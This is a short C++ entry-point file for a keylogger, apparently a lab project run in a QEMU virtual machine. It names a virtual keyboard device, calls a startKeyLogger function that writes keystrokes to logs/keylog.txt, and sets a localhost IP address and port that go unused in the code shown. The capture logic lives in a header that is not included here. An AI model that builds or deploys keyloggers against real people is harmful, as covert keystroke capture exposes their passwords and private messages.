#include "keylogger.hpp"
#include "keyboard_utils.hpp"
#include <iostream>
#include <string>

const std::string IP_ADDRESS = "127.0.0.1";
const std::string PORT = "1984";

int main() {
    const char* device = "/dev/input/by-id/usb-QEMU_QEMU_USB_Keyboard_68284-0000:00:04.0-3-event-kbd";
    if (!startKeyLogger(device, "logs/keylog.txt")) {
        return 1;
    }

    return 0;
}
